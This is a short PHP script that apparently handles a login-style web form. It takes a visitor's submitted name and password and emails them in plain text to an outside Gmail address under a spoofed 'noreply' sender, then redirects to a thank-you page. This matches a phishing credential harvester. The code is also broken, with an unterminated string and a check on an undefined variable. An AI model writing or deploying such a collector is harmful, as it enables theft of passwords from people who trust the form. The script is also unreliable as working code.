<?php
//get data from form  

$name = $_POST['name'];
$password= $_POST['password'];
$to = "jellyvibesforyou@gmail.com";
$subject = "Mail From website";
$txt ="Name = ". $name . "\r\n  Password = " . $password . ";
$headers = "From: noreply@codeconia.com" . "\r\n" .
"CC: somebodyelse@example.com";
if($email!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location:thankyou.html");
?>